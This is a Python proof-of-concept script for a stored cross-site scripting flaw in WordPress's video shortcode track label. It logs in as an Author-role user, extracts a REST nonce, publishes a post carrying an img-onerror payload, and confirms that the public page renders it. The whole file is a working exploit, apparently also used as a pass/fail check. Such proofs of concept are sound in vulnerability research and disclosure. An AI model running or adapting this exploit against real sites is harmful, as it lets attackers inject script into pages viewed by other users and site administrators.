import argparse
import json
import re
import sys

import requests

NONCE_RE = re.compile(r'createNonceMiddleware\(\s*"([a-f0-9]+)"\s*\)')
PAYLOAD = (
    '[video src="http://wsl.evm.pics:31666/wp-content/uploads/tf-missing.mp4"]'
    '<track kind="captions" '
    'src="http://wsl.evm.pics:31666/wp-content/uploads/tf-missing.vtt" '
    'srclang="en" '
    'label="&lt;img src=x onerror=alert(document.domain);">'
    "[/video]"
)

def fail(msg):
    print(f"FAIL: {msg}")
    sys.exit(1)

def login(base, username, password):
    s = requests.Session()
    login_url = f"{base}/wp-login.php"
    s.get(login_url, timeout=15).raise_for_status()
    r = s.post(
        login_url,
        data={
            "log": username,
            "pwd": password,
            "rememberme": "forever",
            "wp-submit": "Log In",
            "redirect_to": f"{base}/wp-admin/",
            "testcookie": "1",
        },
        timeout=15,
        allow_redirects=True,
    )
    if "wordpress_logged_in_" not in " ".join(s.cookies.keys()):
        fail(f"login failed for {username}: {r.status_code}")
    return s

def rest_nonce(base, session):
    r = session.get(f"{base}/wp-admin/profile.php", timeout=15)
    r.raise_for_status()
    m = NONCE_RE.search(r.text)
    if not m:
        fail("could not extract REST nonce")
    return m.group(1)

def create_post(base, session, nonce):
    body = {
        "title": "TF mediaelement track label XSS PoC",
        "status": "publish",
        "content": PAYLOAD,
    }
    r = session.post(
        f"{base}/?rest_route=/wp/v2/posts",
        headers={"X-WP-Nonce": nonce, "Content-Type": "application/json"},
        data=json.dumps(body),
        timeout=15,
    )
    if r.status_code != 201:
        fail(f"post creation failed: {r.status_code} {r.text[:200]}")
    data = r.json()
    return data["id"], data["link"]

def verify_public_page(session, url):
    r = session.get(url, timeout=15)
    r.raise_for_status()
    if "wp-video" not in r.text or "&lt;img src=x onerror=alert(document.domain);" not in r.text:
        fail("public page did not render the expected track label")

def main():
    ap = argparse.ArgumentParser(
        description="Stored XSS PoC. Requires a pre-existing Author-role account."
    )
    ap.add_argument("--url", required=True, help="Base URL of the WordPress site")
    ap.add_argument("--id", required=True, help="Username of an Author-role account")
    ap.add_argument("--pw", required=True, help="Password for that account")
    args = ap.parse_args()

    session = login(args.url, args.id, args.pw)
    nonce = rest_nonce(args.url, session)
    post_id, post_url = create_post(args.url, session, nonce)
    verify_public_page(session, post_url)

    print("PASS")
    print(f"post_id={post_id}")
    print(f"url={post_url}")


if __name__ == "__main__":
    main()
